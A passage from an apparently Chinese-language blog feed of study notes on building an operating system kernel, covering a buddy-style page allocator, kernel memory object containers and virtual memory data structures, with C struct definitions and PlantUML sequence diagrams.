MEMAREA_MAX;</span><br><span class="line">    <span class="comment">//计算下一个空闲内存的开始地址 </span></span><br><span class="line">    mbsp-&gt;mb_nextwtpadr = <span class="built_in">PAGE_ALIGN</span>(phymarea + <span class="built_in">sizeof</span>(<span class="type">memarea_t</span>) * MEMAREA_MAX);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//初始化内存区</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_memarea</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//真正初始化内存区</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">init_memarea_core</span>(&amp;kmachbsp) == FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">system_error</span>(<span class="string">&quot;init_memarea_core fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="内存页的分配"><a href="#内存页的分配" class="headerlink" title="内存页的分配"></a>内存页的分配</h2><p>分配一个页面，这个算法将执行如下步骤：</p>
<ol>
<li>根据一个页面的请求，会返回 m_mdmlielst 数组中的第 0 个 bafhlst_t 结构。</li>
<li>如果第 0 个 bafhlst_t 结构中有 msadsc_t 结构就直接返回，若没有 msadsc_t 结构，就会继续查找 m_mdmlielst 数组中的第 1 个 bafhlst_t 结构。</li>
<li>如果第 1 个 bafhlst_t 结构中也没有 msadsc_t 结构，就会继续查找 m_mdmlielst 数组中的第 2 个 bafhlst_t 结构。</li>
<li>如果第 2 个 bafhlst_t 结构中有 msadsc_t 结构，记住第 2 个 bafhlst_t 结构中对应是 4 个连续的 msadsc_t 结构。这时让这 4 个连续的 msadsc_t 结构从第 2 个 bafhlst_t 结构中脱离。</li>
<li>把这 4 个连续的 msadsc_t 结构，对半分割成 2 个双 msadsc_t 结构，把其中一个双 msadsc_t 结构挂载到第 1 个 bafhlst_t 结构中。</li>
<li>把剩下一个双 msadsc_t 结构，继续对半分割成两个单 msadsc_t 结构，把其中一个单 msadsc_t 结构挂载到第 0 个 bafhlst_t 结构中，剩下一个单 msadsc_t 结构返回给请求者，完成内存分配。</li>
</ol>
<p>内存分配算法示意图。</p>
<img src="/2021/11/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9807-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E7%AE%97%E6%B3%95%E7%A4%BA%E6%84%8F%E5%9B%BE.png" class="">

<p>时序图</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@startuml</span><br><span class="line">mm_division_pages -&gt; mm_divpages_fmwk : 在内存分配接口中将调用内存分配框架。</span><br><span class="line">mm_divpages_fmwk -&gt; onmrtype_retn_marea : 获取对应的内存区结构指针。</span><br><span class="line">mm_divpages_fmwk -&gt; mm_divpages_core : 调用内存分配核心函数。</span><br><span class="line">mm_divpages_core -&gt; mm_reldivpages_onmarea :  内存分配。</span><br><span class="line">mm_reldivpages_onmarea -&gt; onmpgs_retn_bafhlst :  获取内存区请求分配页结构和实际分配页结构 bafhlst_t。</span><br><span class="line">mm_reldivpages_onmarea -&gt; mm_reldpgsdivmsa_bafhl :  处理分配过程。</span><br><span class="line">mm_reldpgsdivmsa_bafhl -&gt; mm_retnmsaob_onbafhlst :  获取内存页结构体的起始地址和结束地址。</span><br><span class="line">mm_reldpgsdivmsa_bafhl -&gt; mm_divpages_opmsadsc :  如果分配的大小正好等于请求分配的大小，则设置 msadsc_t 结构的相关信息表示已经被使用。</span><br><span class="line">mm_reldpgsdivmsa_bafhl -&gt; mrdmb_add_msa_bafh :  如果大小不等，则需要分割。</span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure>

<h2 id="内存页的释放"><a href="#内存页的释放" class="headerlink" title="内存页的释放"></a>内存页的释放</h2><p>释放一个页面，这个算法将执行如下步骤：</p>
<ol>
<li>释放一个页面，会返回 m_mdmlielst 数组中的第 0 个 bafhlst_t 结构。</li>
<li>设置这个页面对应的 msadsc_t 结构的相关信息，表示已经执行了释放操作。</li>
<li>开始查看第 0 个 bafhlst_t 结构中有没有空闲的 msadsc_t，并且它和要释放的 msadsc_t 对应的物理地址是连续的。没有则把这个释放的 msadsc_t 挂载第 0 个 bafhlst_t 结构中，算法结束，否则进入下一步。</li>
<li>把第 0 个 bafhlst_t 结构中的 msadsc_t 结构拿出来与释放的 msadsc_t 结构，合并成 2 个连续且更大的 msadsc_t。</li>
<li>继续查看第 1 个 bafhlst_t 结构中有没有空闲的 msadsc_t，而且这个空闲 msadsc_t 要和上一步合并的 2 个 msadsc_t 对应的物理地址是连续的。没有则把这个合并的 2 个 msadsc_t 挂载第 1 个 bafhlst_t 结构中，算法结束，否则进入下一步。</li>
<li>把第 1 个 bafhlst_t 结构中的 2 个连续的 msadsc_t 结构，还有合并的 2 个地址连续的 msadsc_t 结构拿出来，合并成 4 个连续且更大的 msadsc_t 结构。</li>
<li>继续查看第 2 个 bafhlst_t 结构，有没有空闲的 msadsc_t 结构，并且它要和上一步合并的 4 个 msadsc_t 结构对应的物理地址是连续的。没有则把这个合并的 4 个 msadsc_t 挂载第 2 个 bafhlst_t 结构中，算法结束。</li>
</ol>
<p>内存释放算法示意图。</p>
<img src="/2021/11/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9807-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/%E5%86%85%E5%AD%98%E9%87%8A%E6%94%BE%E7%AE%97%E6%B3%95.png" class="">

<p>时序图</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@startuml</span><br><span class="line">mm_merge_pages -&gt; mm_merpages_fmwk : 调用释放内存页面的框架函数。</span><br><span class="line">mm_merpages_fmwk -&gt; mm_merpages_core : 释放内存页面的核心函数。</span><br><span class="line">mm_merpages_core -&gt; mm_merpages_onmarea : 对一个内存区释放内存页。</span><br><span class="line">mm_merpages_onmarea -&gt; onfpgs_retn_bafhlst : 获取请求释放和最大释放的 bafhlst_t 结构指针。</span><br><span class="line">mm_merpages_onmarea -&gt; mm_merpages_opmsadsc : 设置 msadsc_t 结构的信息。</span><br><span class="line">mm_merpages_onmarea -&gt; mm_merpages_onbafhlst : 对 msadsc_t 结构进行合并。</span><br><span class="line">mm_merpages_onbafhlst -&gt; mm_merpages_onbafhlst : 将合并的 msadsc_t 结构加入对应的 bafhlst_t 结构中。</span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure>

<p>整个流程基本结束，后面有时间再看细节。</p>
]]></content>
      <categories>
        <category>操作系统实战</category>
      </categories>
      <tags>
        <tag>操作系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实战08-内存对象管理</title>
    <url>/2021/11/18/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9808-%E5%86%85%E5%AD%98%E5%AF%B9%E8%B1%A1%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h1 id="内存对象管理数据结构"><a href="#内存对象管理数据结构" class="headerlink" title="内存对象管理数据结构"></a>内存对象管理数据结构</h1><p>用 freobjh_t 结构表示一个对象了，如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_FREOBJH</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">list_h_t</span> oh_list;     <span class="comment">// 内存对象链表</span></span><br><span class="line">    <span class="type">uint_t</span> oh_stus;       <span class="comment">// 内存对象状态</span></span><br><span class="line">    <span class="type">void</span>* oh_stat;        <span class="comment">// 内存对象的开始地址</span></span><br><span class="line">&#125;<span class="type">freobjh_t</span>;</span><br></pre></td></tr></table></figure>

<p>kmsob_t 用于表示内存对象容器，kmbext_t 用于表示内存对象容器的扩展内存，msomdc_t 和 msclst_t 用于管理内存对象容器占用的物理内存页面。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//管理内存对象容器占用的内存页面所对应的msadsc_t结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_MSCLST</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint_t</span> ml_msanr;  <span class="comment">//多少个msadsc_t</span></span><br><span class="line">    <span class="type">uint_t</span> ml_ompnr;  <span class="comment">//一个msadsc_t对应的连续的物理内存页面数</span></span><br><span class="line">    <span class="type">list_h_t</span> ml_list; <span class="comment">//挂载msadsc_t的链表</span></span><br><span class="line">&#125;<span class="type">msclst_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//管理内存对象容器占用的内存</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_MSOMDC</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//msclst_t结构数组mc_lst[0]=1个连续页面的msadsc_t</span></span><br><span class="line">    <span class="comment">//               mc_lst[1]=2个连续页面的msadsc_t</span></span><br><span class="line">    <span class="comment">//               mc_lst[2]=4个连续页面的msadsc_t</span></span><br><span class="line">    <span class="comment">//               mc_lst[3]=8个连续页面的msadsc_t</span></span><br><span class="line">    <span class="comment">//               mc_lst[4]=16个连续页面的msadsc_t</span></span><br><span class="line">    <span class="type">msclst_t</span> mc_lst[MSCLST_MAX];</span><br><span class="line">    <span class="type">uint_t</span> mc_msanr;   <span class="comment">//总共多个msadsc_t结构</span></span><br><span class="line">    <span class="type">list_h_t</span> mc_list;</span><br><span class="line">    <span class="comment">//内存对象容器第一个占用msadsc_t</span></span><br><span class="line">    <span class="type">list_h_t</span> mc_kmobinlst;</span><br><span class="line">    <span class="comment">//内存对象容器第一个占用msadsc_t对应的连续的物理内存页面数</span></span><br><span class="line">    <span class="type">uint_t</span> mc_kmobinpnr;</span><br><span class="line">&#125;<span class="type">msomdc_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//管理内存对象容器扩展容量</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_KMBEXT</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">list_h_t</span> mt_list;        <span class="comment">//链表</span></span><br><span class="line">    <span class="type">adr_t</span> mt_vstat;          <span class="comment">//内存对象容器扩展容量开始地址</span></span><br><span class="line">    <span class="type">adr_t</span> mt_vend;           <span class="comment">//内存对象容器扩展容量结束地址</span></span><br><span class="line">    <span class="type">kmsob_t</span>* mt_kmsb;        <span class="comment">//指向内存对象容器结构</span></span><br><span class="line">    <span class="type">uint_t</span> mt_mobjnr;        <span class="comment">//内存对象容器扩展容量的内存中有多少对象</span></span><br><span class="line">&#125;<span class="type">kmbext_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内存对象容器</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_KMSOB</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">list_h_t</span> so_list;        <span class="comment">//链表</span></span><br><span class="line">    <span class="type">spinlock_t</span> so_lock;      <span class="comment">//保护结构自身的自旋锁</span></span><br><span class="line">    <span class="type">uint_t</span> so_stus;          <span class="comment">//状态与标志</span></span><br><span class="line">    <span class="type">uint_t</span> so_flgs;</span><br><span class="line">    <span class="type">adr_t</span> so_vstat;          <span class="comment">//内存对象容器的开始地址</span></span><br><span class="line">    <span class="type">adr_t</span> so_vend;           <span class="comment">//内存对象容器的结束地址</span></span><br><span class="line">    <span class="type">size_t</span> so_objsz;         <span class="comment">//内存对象大小</span></span><br><span class="line">    <span class="type">size_t</span> so_objrelsz;      <span class="comment">//内存对象实际大小</span></span><br><span class="line">    <span class="type">uint_t</span> so_mobjnr;        <span class="comment">//内存对象容器中总共的对象个数</span></span><br><span class="line">    <span class="type">uint_t</span> so_fobjnr;        <span class="comment">//内存对象容器中空闲的对象个数</span></span><br><span class="line">    <span class="type">list_h_t</span> so_frelst;      <span class="comment">//内存对象容器中空闲的对象链表头</span></span><br><span class="line">    <span class="type">list_h_t</span> so_alclst;      <span class="comment">//内存对象容器中分配的对象链表头</span></span><br><span class="line">    <span class="type">list_h_t</span> so_mextlst;     <span class="comment">//内存对象容器扩展kmbext_t结构链表头</span></span><br><span class="line">    <span class="type">uint_t</span> so_mextnr;        <span class="comment">//内存对象容器扩展kmbext_t结构个数</span></span><br><span class="line">    <span class="type">msomdc_t</span> so_mc;          <span class="comment">//内存对象容器占用内存页面管理结构</span></span><br><span class="line">    <span class="type">void</span>* so_privp;          <span class="comment">//本结构私有数据指针</span></span><br><span class="line">    <span class="type">void</span>* so_extdp;          <span class="comment">//本结构扩展数据指针</span></span><br><span class="line">&#125;<span class="type">kmsob_t</span>;</span><br></pre></td></tr></table></figure>

<p>内存对象容器关系</p>
<img src="/2021/11/18/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9808-%E5%86%85%E5%AD%98%E5%AF%B9%E8%B1%A1%E7%AE%A1%E7%90%86/%E5%86%85%E5%AD%98%E5%AF%B9%E8%B1%A1%E5%AE%B9%E5%99%A8%E5%85%B3%E7%B3%BB.png" class="">

<p>管理内存对象容器 kmsob_t 结构的数据结构如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> KOBLST_MAX (64)</span></span><br><span class="line"><span class="comment">//挂载kmsob_t结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_KOBLST</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">list_h_t</span> ol_emplst; <span class="comment">// 挂载 kmsob_t 结构的链表</span></span><br><span class="line">    <span class="type">kmsob_t</span>* ol_cahe;   <span class="comment">// 最近一次查找的 kmsob_t 结构</span></span><br><span class="line">    <span class="type">uint_t</span> ol_emnr;     <span class="comment">// 挂载 kmsob_t 结构的数量</span></span><br><span class="line">    <span class="type">size_t</span> ol_sz;       <span class="comment">// kmsob_t 结构中内存对象的大小</span></span><br><span class="line">&#125;<span class="type">koblst_t</span>;</span><br><span class="line"><span class="comment">//管理 kmsob_t 结构的数据结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_KMSOBMGRHED</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">spinlock_t</span> ks_lock;  <span class="comment">// 保护自身的自旋锁</span></span><br><span class="line">    <span class="type">list_h_t</span> ks_tclst;   <span class="comment">// 链表</span></span><br><span class="line">    <span class="type">uint_t</span> ks_tcnr;</span><br><span class="line">    <span class="type">uint_t</span> ks_msobnr;    <span class="comment">// 总共多少个 kmsob_t 结构</span></span><br><span class="line">    <span class="type">kmsob_t</span>* ks_msobche; <span class="comment">// 最近分配内存对象的 kmsob_t 结构</span></span><br><span class="line">    <span class="type">koblst_t</span> ks_msoblst[KOBLST_MAX]; <span class="comment">//koblst_t结构数组</span></span><br><span class="line">&#125;<span class="type">kmsobmgrhed_t</span>;</span><br></pre></td></tr></table></figure>
<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>时序图</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@startuml</span><br><span class="line">init_kmsob -&gt; kmsobmgrhed_t_init : 初始化管理 kmsob_t 结构的数据结构 kmsobmgrhed_t 结构体。</span><br><span class="line">kmsobmgrhed_t_init -&gt; koblst_t_init : 初始化koblst_t结构体。</span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure>
<p>这里需要注意的是 ks_msoblst 数组中 kmsob_t 结构中内存对象的大小 ol_sz 初始值为 32 字节，并且每次递增 32，即 kmsob_t 内存容器中存放的单个内存对象最大内存大小为 32*64 &#x3D; 2048 字节。</p>
<h1 id="分配内存对象"><a href="#分配内存对象" class="headerlink" title="分配内存对象"></a>分配内存对象</h1><p>时序图</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@startuml</span><br><span class="line">kmsob_new -&gt; kmsob_new_core : 调用核心函数。</span><br><span class="line">kmsob_new_core -&gt; onmsz_retn_koblst : 根据内存对象大小查找并返回 ks_msoblst 数组元素的指针。</span><br><span class="line">kmsob_new_core -&gt; onkoblst_retn_newkmsob : 查询 ks_msoblst 数组元素的指针对应的内存对象容器并返回。</span><br><span class="line">onkoblst_retn_newkmsob -&gt; scan_newkmsob_isok : 看看内存对象容器是不是合乎要求。</span><br><span class="line">kmsob_new_core -&gt; _create_kmsob : 第一次分配内存对象时，必然需要建立一个内存对象容器。</span><br><span class="line">_create_kmsob -&gt; mm_division_pages : 为内存对象容器分配物理内存空间。</span><br><span class="line">_create_kmsob -&gt; _create_init_kmsob : 初始化 kmsob_t 内存对象容器并建立内存对象。</span><br><span class="line">_create_init_kmsob -&gt; kmsob_t_init : 初始化 kmsob_t 内存对象容器。</span><br><span class="line">_create_init_kmsob -&gt; freobjh_t_init : 初始化 freobjh_t 内存对象。</span><br><span class="line">_create_kmsob -&gt; kmsob_add_koblst : 把 kmsob_t 内存容器结构，挂载到对应的 koblst_t 结构中去。</span><br><span class="line">kmsob_new_core -&gt; kmsob_new_onkmsob : 分配内存对象。</span><br><span class="line">kmsob_new_onkmsob -&gt; scan_kmsob_objnr : 判断内存对象容器中有没有空闲的内存对象。</span><br><span class="line">kmsob_new_onkmsob -&gt; kmsob_extn_pages : 如果没有空闲内存对象，则扩展内存对象容器的内存。</span><br><span class="line">kmsob_extn_pages -&gt; mm_division_pages : 为内存对象容器分配物理内存空间。</span><br><span class="line">kmsob_extn_pages -&gt; retn_mscidx : 获取物理内存页面数对应在 kmsob_t 的 so_mc.mc_lst 数组中下标。</span><br><span class="line">kmsob_extn_pages -&gt; kmbext_t_init : 初始化扩展内存 kmbext_t 数据结构。</span><br><span class="line">kmsob_extn_pages -&gt; freobjh_t_init : 在扩展的内存空间中建立内存对象。</span><br><span class="line">kmsob_new_onkmsob -&gt; kmsob_new_opkmsob : 实际分配内存对象。</span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure>

<h2 id="释放内存对象"><a href="#释放内存对象" class="headerlink" title="释放内存对象"></a>释放内存对象</h2><p>时序图</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@startuml</span><br><span class="line">kmsob_delete -&gt; kmsob_delete_core : 调用释放内存对象的核心函数。</span><br><span class="line">kmsob_delete_core -&gt; onmsz_retn_koblst : 根据内存对象大小查找并返回 ks_msoblst 数组元素的指针。</span><br><span class="line">kmsob_delete_core -&gt; onkoblst_retn_delkmsob : 查找释放内存对象所属的 kmsob_t 结构。</span><br><span class="line">onkoblst_retn_delkmsob -&gt; scan_delkmsob_isok : 检查释放的内存对象是不是属于这个 kmsob_t 结构。</span><br><span class="line">kmsob_delete_core -&gt; kmsob_delete_onkmsob : 释放内存对象。</span><br><span class="line">kmsob_delete_onkmsob -&gt; kmsob_del_opkmsob : 实际完成内存对象释放。</span><br><span class="line">kmsob_delete_core -&gt; _destroy_kmsob : 销毁内存对象容器。</span><br><span class="line">_destroy_kmsob -&gt; scan_freekmsob_isok : 看看能不能销毁。</span><br><span class="line">_destroy_kmsob -&gt; _destroy_kmsob_core : 调用销毁内存对象容器的核心函数。</span><br><span class="line">_destroy_kmsob_core -&gt; mm_merge_pages : 释放 msadsc_t 对应的物理内存页面。</span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure>













]]></content>
      <categories>
        <category>操作系统实战</category>
      </categories>
      <tags>
        <tag>操作系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实战09-虚拟内存</title>
    <url>/2021/11/19/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9809-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/</url>
    <content><![CDATA[<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><p>虚拟地址区间</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 虚拟地址空间</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">KMVARSDSC</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">spinlock_t</span> kva_lock;	<span class="comment">// 保护自身自旋锁</span></span><br><span class="line">	<span class="type">u32_t</span>  kva_maptype;		<span class="comment">// 映射类型</span></span><br><span class="line">	<span class="type">list_h_t</span> kva_list;		<span class="comment">// 链表</span></span><br><span class="line">	<span class="type">u64_t</span>  kva_flgs;		<span class="comment">// 相关标志</span></span><br><span class="line">	<span class="type">u64_t</span>  kva_limits;</span><br><span class="line">	<span class="type">vaslknode_t</span> kva_lknode;</span><br><span class="line">	<span class="type">void</span>*  kva_mcstruct;	<span class="comment">// 指向它的上层结构</span></span><br><span class="line">	<span class="type">adr_t</span>  kva_start;		<span class="comment">// 虚拟地址的开始</span></span><br><span class="line">	<span class="type">adr_t</span>  kva_end;			<span class="comment">// 虚拟地址的结束</span></span><br><span class="line">	<span class="type">kvmemcbox_t</span>* kva_kvmbox;<span class="comment">// 管理这个结构映射的物理页面</span></span><br><span class="line">	<span class="type">void</span>*  kva_kvmcobj;</span><br><span class="line">&#125;<span class="type">kmvarsdsc_t</span>;</span><br></pre></td></tr></table></figure>

<p>虚拟地址空间描述结构</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 虚拟地址空间描述结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_VIRMEMADRS</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">spinlock_t</span> vs_lock;			<span class="comment">// 保护自身的自旋锁</span></span><br><span class="line">	<span class="type">u32_t</span>  vs_resalin;</span><br><span class="line">	<span class="type">list_h_t</span> vs_list;			<span class="comment">// 链表，链接虚拟地址区间</span></span><br><span class="line">	<span class="type">uint_t</span> vs_flgs;				<span class="comment">// 标志</span></span><br><span class="line">	<span class="type">uint_t</span> vs_kmvdscnr;			<span class="comment">// 多少个虚拟地址区间</span></span><br><span class="line">	<span class="type">mmadrsdsc_t</span>* vs_mm;			<span class="comment">// 指向它的上层的数据结构</span></span><br><span class="line">	<span class="type">kmvarsdsc_t</span>* vs_startkmvdsc;<span class="comment">// 开始的虚拟地址区间</span></span><br><span class="line">	<span class="type">kmvarsdsc_t</span>* vs_endkmvdsc;	<span class="comment">// 结束的虚拟地址区间</span></span><br><span class="line">	<span class="type">kmvarsdsc_t</span>* vs_currkmvdsc;	<span class="comment">// 当前的虚拟地址区间</span></span><br><span class="line">	<span class="type">kmvarsdsc_t</span>* vs_krlmapdsc;	<span class="comment">// 能分配的开始虚拟地址</span></span><br><span class="line">	<span class="type">kmvarsdsc_t</span>* vs_krlhwmdsc;	<span class="comment">// 能分配的结束虚拟地址</span></span><br><span class="line">	<span class="type">kmvarsdsc_t</span>* vs_krlolddsc;	</span><br><span class="line">	<span class="type">kmvarsdsc_t</span>* vs_heapkmvdsc;</span><br><span class="line">	<span class="type">kmvarsdsc_t</span>* vs_stackkmvdsc;</span><br><span class="line">	<span class="type">adr_t</span> vs_isalcstart;</span><br><span class="line">	<span class="type">adr_t</span> vs_isalcend;</span><br><span class="line">	<span class="type">void</span>* vs_privte;			<span class="comment">// 私有数据指针</span></span><br><span class="line">	<span class="type">void</span>* vs_ext;				<span class="comment">// 扩展数据指针</span></span><br><span class="line">&#125;<span class="type">virmemadrs_t</span>;</span><br></pre></td></tr></table></figure>

<p>进程的内存地址空间</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 进程的内存地址空间</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_MMADRSDSC</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">spinlock_t</span> msd_lock;		<span class="comment">// 保护自身的自旋锁</span></span><br><span class="line">	<span class="type">list_h_t</span> msd_list;			<span class="comment">// 链表</span></span><br><span class="line">	<span class="type">uint_t</span> msd_flag;			<span class="comment">// 状态和标志</span></span><br><span class="line">	<span class="type">uint_t</span> msd_stus;</span><br><span class="line">	<span class="type">uint_t</span> msd_scount;			<span class="comment">// 计数，该结构可能被共享</span></span><br><span class="line">	<span class="type">thread_t</span>* msd_thread;	</span><br><span class="line">	<span class="type">sem_t</span>  msd_sem;				<span class="comment">// 信号量</span></span><br><span class="line">	<span class="type">mmudsc_t</span> msd_mmu;			<span class="comment">// MMU相关的信息</span></span><br><span class="line">	<span class="type">virmemadrs_t</span> msd_virmemadrs;<span class="comment">// 虚拟地址空间</span></span><br><span class="line">	<span class="type">adr_t</span> msd_stext;			<span class="comment">// 应用的指令区的开始、结束地址</span></span><br><span class="line">	<span class="type">adr_t</span> msd_etext;</span><br><span class="line">	<span class="type">adr_t</span> msd_sdata;			<span class="comment">// 应用的数据区的开始、结束地址</span></span><br><span class="line">	<span class="type">adr_t</span> msd_edata;</span><br><span class="line">	<span class="type">adr_t</span> msd_sbss;</span><br><span class="line">	<span class="type">adr_t</span> msd_ebss;</span><br><span class="line">	<span class="type">adr_t</span> msd_sbrk;				<span class="comment">// 应用的堆区的开始、结束地址</span></span><br><span class="line">	<span class="type">adr_t</span> msd_ebrk;</span><br><span class="line">&#125;<span class="type">mmadrsdsc_t</span>;</span><br></pre></td></tr></table></figure>

<p>页面盒子</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 页面盒子</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">KVMEMCBOX</span> </span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">list_h_t</span> kmb_list;			<span class="comment">// 链表</span></span><br><span class="line">	<span class="type">spinlock_t</span> kmb_lock;		<span class="comment">// 保护自身的自旋锁</span></span><br><span class="line">	<span class="type">refcount_t</span> kmb_cont;		<span class="comment">// 共享的计数器</span></span><br><span class="line">	<span class="type">u64_t</span> kmb_flgs;				<span class="comment">// 状态和标志</span></span><br><span class="line">	<span class="type">u64_t</span> kmb_stus;</span><br><span class="line">	<span class="type">u64_t</span> kmb_type;				<span class="comment">// 类型</span></span><br><span class="line">	<span class="type">uint_t</span> kmb_msanr;			<span class="comment">// 多少个msadsc_t</span></span><br><span class="line">	<span class="type">list_h_t</span> kmb_msalist;		<span class="comment">// 挂载msadsc_t结构的链表</span></span><br><span class="line">	<span class="type">kvmemcboxmgr_t</span>* kmb_mgr;	<span class="comment">// 指向上层结构</span></span><br><span class="line">	<span class="type">void</span>* kmb_filenode;			<span class="comment">// 指向文件节点描述符</span></span><br><span class="line">	<span class="type">void</span>* kmb_pager;			<span class="comment">// 指向分页器 暂时不使用</span></span><br><span class="line">	<span class="type">void</span>* kmb_ext;				<span class="comment">// 自身扩展数据指针</span></span><br><span class="line">&#125;<span class="type">kvmemcbox_t</span>;</span><br></pre></td></tr></table></figure>
<p>页面盒子的头</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 页面盒子的头</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">KVMEMCBOXMGR</span> </span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">list_h_t</span> kbm_list;		<span class="comment">// 链表</span></span><br><span class="line">	<span class="type">spinlock_t</span> kbm_lock;	<span class="comment">// 保护自身的自旋锁</span></span><br><span class="line">	<span class="type">u64_t</span> kbm_flgs;			<span class="comment">// 标志与状态</span></span><br><span class="line">	<span class="type">u64_t</span> kbm_stus;	</span><br><span class="line">	<span class="type">uint_t</span> kbm_kmbnr;		<span class="comment">// kvmemcbox_t结构个数</span></span><br><span class="line">	<span class="type">list_h_t</span> kbm_kmbhead;	<span class="comment">// 挂载kvmemcbox_t结构的链表</span></span><br><span class="line">	<span class="type">uint_t</span> kbm_cachenr;		<span class="comment">// 缓存空闲kvmemcbox_t结构的个数</span></span><br><span class="line">	<span class="type">uint_t</span> kbm_cachemax;	<span class="comment">// 最大缓存个数，超过了就要释放</span></span><br><span class="line">	<span class="type">uint_t</span> kbm_cachemin;	<span class="comment">// 最小缓存个数</span></span><br><span class="line">	<span class="type">list_h_t</span> kbm_cachehead;	<span class="comment">// 缓存kvmemcbox_t结构的链表</span></span><br><span class="line">	<span class="type">void</span>* kbm_ext;			<span class="comment">// 扩展数据指针</span></span><br><span class="line">&#125;<span class="type">kvmemcboxmgr_t</span>;</span><br></pre></td></tr></table></figure>

<img src="/2021/11/19/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9809-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.png" class="">

<p>初始化时序图</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@startuml</span><br><span class="line">init_kvirmemadrs -&gt; mmadrsdsc_t_init : 初始化 mmadrsdsc_t 结构</span><br><span class="line">init_kvirmemadrs -&gt; kvma_inituserspace_virmemadrs : 初始化进程的用户空间 </span><br><span class="line">kvma_inituserspace_virmemadrs -&gt; new_kmvarsdsc : 分配一个 kmvarsdsc_t </span><br><span class="line">new_kmvarsdsc -&gt; kmsob_new : 分配内存对象。</span><br><span class="line">new_kmvarsdsc -&gt; kmvarsdsc_t_init : 初始化进程内存地址空间。</span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure>
<p>mmadrsdsc_t_init 函数功能：初始化全局变量 initmmadrsdsc 。</p>
